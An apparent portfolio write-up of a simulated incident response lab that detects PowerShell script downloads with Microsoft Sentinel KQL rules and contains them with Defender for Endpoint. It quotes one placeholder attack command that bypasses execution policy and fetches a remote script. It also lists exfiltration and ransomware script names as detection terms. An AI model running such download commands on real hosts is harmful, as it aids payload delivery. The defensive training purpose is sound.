
# Incident Response: 🚨Suspicious PowerShell Activity Detection & Containment

This project demonstrates a real-world scenario of detecting and responding to post-exploitation activity using Microsoft Defender for Endpoint (MDE) and Microsoft Sentinel. The attacker leveraged native tools (living off the land binaries) in this case, PowerShell to download and potentially execute malicious scripts. The incident was triaged, contained, and documented using best practices based on the **NIST 800-61r3 Incident Response Lifecycle**.

---

## 📌 Scenario Overview

Attackers often use built-in tools like `powershell.exe` to avoid detection when downloading malicious payloads. In this simulated attack, PowerShell was used to run `Invoke-WebRequest` and retrieve various scripts from the internet.

Key script activities included:
- Simulated malware test file (`eicar.ps1`)
- Fake data exfiltration (`exfiltratedata.ps1`)
- Network port scanning (`portscan.ps1`)
- (Optional) Ransomware simulation (`pwncrypt.ps1`)

---

## 🔍 Detection & Alerting

A **Scheduled Analytics Rule** was created in Microsoft Sentinel to identify suspicious web requests via PowerShell:

### 🔎 KQL Query:
```kql
let TargetHostname = "Yusuf-vm";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
| order by TimeGenerated
```
---

## 🔔 Alert Configuration

- **Rule Name**: Yusuf-Rule (PowerShell Suspicious Web Request)
- **Run Frequency**: Every 4 hours
- **Entity Mapping**: Device, Account, Process
- **Incident Creation**: Enabled

### MITRE ATT&CK:
- **T1059.001** – Command and Scripting Interpreter: PowerShell
- **T1105** – Ingress Tool Transfer

---

## ⚙️ Incident Workflow

| Phase                | Actions Taken                                                                 |
|----------------------|-------------------------------------------------------------------------------|
| Preparation          | Tools and alerting rules were configured; test scripts were pre-loaded.      |
| Detection & Analysis | Alert triggered from Sentinel. Logs confirmed multiple suspicious downloads. |
| Containment          | `yusuf-vm` was isolated using Microsoft Defender for Endpoint.               |
| Eradication & Recovery | Verified script behavior; anti-malware scan run; system returned to normal. |
| Post-Incident        | User enrolled in cybersecurity awareness training; PowerShell access restricted.|

---

## 📂 Evidence & Artifacts

### 🧾 Alert Triggered Commands
```powershell
powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri "<malicious_url>" -OutFile "C:\programdata\<script>.ps1"
```

### 🛠️ Executed Scripts
- `eicar.ps1` – Antivirus test  
- `exfiltratedata.ps1` – Simulated exfil  
- `portscan.ps1` – Internal port scan  
- `pwncrypt.ps1` – (Ransomware)  

### 🧪 Post-Isolation Query
```kql
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == "Yusuf-vm"
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
```

## 🛡️ Response Actions

After detecting suspicious PowerShell activity, the following response steps were executed:

| **Action**                  | **Description**                                                                 |
|-----------------------------|---------------------------------------------------------------------------------|
| **🔒 Host Isolation**        | `yusuf-vm` was isolated using Microsoft Defender for Endpoint to prevent further compromise. |
| **🔍 Script Analysis**       | Reviewed the downloaded scripts to understand their intent and assess potential damage. |
| **🧼 Malware Scanning**      | Performed a full anti-malware scan to ensure the system was clean.              |
| **♻️ Restoration**           | Verified system stability and safely returned the host to the network.         |
| **🚫 Policy Enforcement**    | Applied PowerShell usage restrictions for non-admin users to reduce the attack surface. |
| **📚 User Awareness Training** | Enrolled the user in cybersecurity awareness training to prevent future incidents. |






---
## 📝 User Interaction
The user was contacted and reported that they had attempted to install a free piece of software around the time the scripts were executed. They mentioned seeing a brief black screen, after which "nothing happened." This matched the timeline of the suspicious activity.

## 🔍 Script Analysis
Using Microsoft Defender for Endpoint, we verified that the downloaded scripts did indeed execute. The following query was used for confirmation:

```kql
let TargetHostname = "yusuf-vm";
let ScriptNames = dynamic(["eicar.ps1", "exfiltratedata.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName
```
---
##  🧪 Script Review (Malware Reverse Engineering)
The scripts were submitted to the malware reverse engineering team for analysis. Below are the summaries provided for each script:

**`Portscan.ps1`**: Scans a specified range of IP addresses for common open ports and logs the results.

**`eicar.ps1`**: Creates a standard EICAR test file to verify antivirus software detection capabilities.

**`exfiltratedata`**.ps1: Generates fake employee data, compresses it, and prepares it for simulated exfiltration.

**`pwncrypt.ps1`**: Analysis Pending — confirmation required

---

## ✅ Post-Incident Activities
**User Awareness** Training: The user was enrolled in additional cybersecurity awareness training via KnowBe4, with increased frequency.

**Policy Enforcement**: Initiated the implementation of a policy to restrict PowerShell access for non-essential users.


---

# ✅ Key Takeaways

- PowerShell misuse is a common vector for attackers post-compromise.  
- Native tools like Microsoft Defender for Endpoint (MDE) and Microsoft Sentinel are powerful for detection and response.  
- Simulated attack scenarios help reinforce skills in threat detection, incident handling, and automation of security controls.  
- Response must include both technical and user-based remediation (e.g., training and policy enforcement).

---
